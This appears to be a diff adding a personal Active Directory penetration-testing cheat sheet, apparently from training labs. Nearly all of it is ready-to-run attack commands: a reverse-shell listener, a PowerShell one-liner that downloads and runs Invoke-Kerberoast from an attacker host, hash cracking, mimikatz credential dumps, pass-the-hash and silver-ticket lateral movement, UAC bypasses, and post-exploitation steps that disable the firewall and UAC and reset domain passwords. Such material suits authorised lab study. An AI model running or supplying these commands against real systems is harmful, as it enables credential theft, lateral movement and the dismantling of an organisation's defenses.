@@ -1,0 +1,159 @@
+Most of this assumes at least the first host within an AD has been fully compromised, though a few commands are still viable with a low-level user account.
+
+***************
+| ENUMERATION |
+***************
+
+What is our hostname-> hostname
+What is our user-> whoami
+What groups are we a part of?-> whoami /groups
+Users on system-> net user
+Users on domain-> net user /domain
+Specific user info-> net user <username> (optional: /domain)
+What localgroups are there-> net localgroup
+Specific users within a localgroup-> net localgroup <group name>
+Domain Name-> systeminfo | findstr /B /C:”Domain”
+General system info dump-> systeminfo
+View shared resources on a host-> net view <hostname>
+IP configuration-> ipconfig
+SPN (Service Principle) users-> setspn -T <domain name> -Q */*
+Check if UAC is enabled->  reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
+	(Check "EnableLUA"; 0x1 = activated && Check "ConsentPromptBehaviorAdmin": anything other than 0 than it's enabled)
+Check Build Version: systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+Is our current powershell running in 64 bit?-> [Environment]::Is64BitProcess
+	Run powershell64 from cmd32: %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
+What's the IP of an AD host?-> ping <hostname>
+
+**************************
+| USEFUL COMMANDS/ TOOLS |
+**************************
+
+More stable reverse shell-> rlwrap nc -nvlp 4444
+RDP-> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:IP /u:USER /p:PASS
+Start kali's FTP service-> sudo systemctl restart pure-ftpd
+	Be sure to set file transfer type to binary, otherwise file corrupts occur-> ftp> binary
+Download remote file-> certutil.exe -urlcache -split -f <url of file> <location to save file>
+	Powershell Variant-> Invoke-WebRequest -Uri <url of the file> -OutFile <output file>
+Spawn high-integrity shell (assumed admin, no UAC)-> powershell.exe Start-Process cmd.exe -Verb runAs
+Upload file-> ftp <ip> + cd loot + put <file>
+	OR: copy localFile.txt \\<kali IP>\shareName
+Add low level account to local admin group-> net localgroup Administrators <username> /add
+
+************************
+| EXPLOITING SPN USERS |
+************************
+
+SPN users can have kerberos tickets requested, even from other accounts. We can abuse this by loading their kerberos ticket onto local memory, and trying to 'kerberoast' it (crack it) for their password. If this user is an admin, it's an easy way for us to get an admin shell.
+	setspn -T <domain name> -Q */*
+Stop and check: is the user part of an admin or RDP group?
+	net user <username> /domain
+Continuing exploitation:
+	Add-Type -AssemblyName System.IdentityModel
+	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<Targeted User's SPN/ Name>"
+	klist (check if it's there)
+From here, host python web server with "Invoke-Kerberoast.ps1" script in directory.
+	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.183/ftphome/powershellScripts/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
+Back to kali with our hash:
+	hashcat -a 0 -m 13100 kerb-hash /usr/share/wordlists/rockyou.txt
+And now we have the SPN account's password, all without even logging into their account.
+Bring PsExec.exe onto the host, and let's execute a shell as this user:
+	PsExec.exe \\Hostname -u DOMAIN\User cmd
+	powershell.exe Start-Process cmd.exe -Verb runAs
+
+***************************
+| LOCAL USERS (LOGGED ON) |
+***************************
+
+If you see a user directory for a domain user on a compromised host, and you have admin access, their password may be retrievable via plaintext/ mimi:
+	mim> privilege::debug
+	mim> sekurlsa::tickets
+	If you get an error, use a legacy version: https://github.com/caday00/mimikatz2.1.1/blob/master/mimikatz_trunk.zip
+		(or ~/Kali/Tools/windows/mimikatzLegacy)
+
+****************************************
+| LATERAL MOVEMENT - OVERPASS THE HASH |
+****************************************
+
+Note: This technique is limited (works best with RDP connection), and assumes the following things are true:
+	1) target user's NTLM hash (assumed from mimikatz dump)
+	2) File and Printer sharing enabled on target
+	3) Firewall not blocking SMB
+	4) Authentication performed via NTLM, NOT Kerberos
+Let's start from mimikatz, and then launch via PsExec:
+	mim> privilege::debug
+	mim> lsadump::lsa /patch
+		OR: mim> sekurlsa::logonpasswords
+	mim> sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:Powershell.exe
+(Within new powershell window:) Grab some Kerberos tickets from target host, and perform a quick check:
+	net use \\<hostname>
+	klist
+Now we should have our NTLM hash ready to be passed. Use PSExec now to target our host w/o password:
+	PsExec.exe \\<hostname> cmd.exe
+
+*******************************************
+| LATERAL MOVEMENT - REMOTE PASS THE HASH |
+*******************************************
+
+If we already have the full NTLM hash (ie user:###:LMhash:NTLMhash:::), we can try to pass the hash with pth-winexe:
+	Check on kali (is Admin share enabled?): smbclient -L $IP (-U <user>)
+	kali> pth-winexe -U <username>%<LM Hash:NTLM Hash> //<IP> cmd
+	pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
+
+Odd One-Off (RDP session via PTH):
+Target must be Windows 2012 R2 or Windows 8.1, with RDP allowed.
+	xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<IP> /u:<user> /d:<domain, optional> /pth:<NTLM hash>
+	Ex:
+	xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.11.1.21 /u:pete /d:svcorp /pth:0f951bc4fdc5dfcd148161420b9c6207
+
+************************************
+| LATERAL MOVEMENT - SILVER TICKET |
+************************************
+
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
+Assumed: We have a high-integrity shell, and mimikatz on system with a local admin account. We should also have a targeted host, and a hash for a user we want to create a silver ticket for.
+Silver tickets "pass the hash" for the user, in order to get a kerberos ticket on-system from the targeted host.
+	whoami /user -> (copy the SID value, minus the bit after the last "-")
+	mim> privilege::debug
+	mim> lsadump::lsa /patch -> (copy NTLM hash of user)
+		Alt: mim> sekurlsa::logonpasswords
+	mim> kerberos::golden /user:___ /domain:___ /sid:___ /target:<target hostname> /service:HTTP /rc4:<passwd hash> /ptt
+With this silver ticket loaded into memory, our user (inputted into the ticket) should have additional permissions on the targeted host, equal to those of the service account associated with the service we used (ie HTTP in this case). We now have low-level access on another machine for our compromised user.
+	.\PsExec.exe -accepteula \\<hostname> cmd
+
+*****************
+| BYPASSING UAC |
+*****************
+
+Extensive list: 
+https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md
+It's assumed that we're part of an admin group (or escalated privileges), but have no GUI access for the host.
+Quick test (should brick shell if UAC's enabled): powershell.exe Start-Process cmd.exe -Verb runAs
+Enumerating UAC information:
+	reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
+        (Check "EnableLUA"; 0x1 = activated && Check "ConsentPromptBehaviorAdmin": anything other than 0 than it's enabled)
+	https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs#uac
+While there's a lot of different ways to bypass UAC, the most common are:
+	1) Fodhelper
+	2) ComputerDefaults
+	3) Metasploit
+		For msf, "background" the reverse shell, and then "search uac" and try the available exploits.
+Additionally, we can use Powershell Empire's scripts to automate this, located under:
+	/usr/share/powershell-empire/empire/server/data/module_source/privesc/...
+	/var/www/html/ftphome/powershellScripts/UACBypass/...
+
+*****************************************
+| POST-EXPLOIT: WEAKEN SECURITY POSTURE |
+*****************************************
+
+Add users as you like to Remote Desktop Users group, it's just a nice touch to work with.
+Remove passwd requirements for RDP users:
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f
+Change password across domain:
+	net user <username> <password> /domain
+Disable Firewall:
+	NetSh Advfirewall set allprofiles state off
+Allow insecure file transfer (bypass Group Policy):
+	reg delete HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /f
+	reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 0x1 /f
+Disable UAC:
+	reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
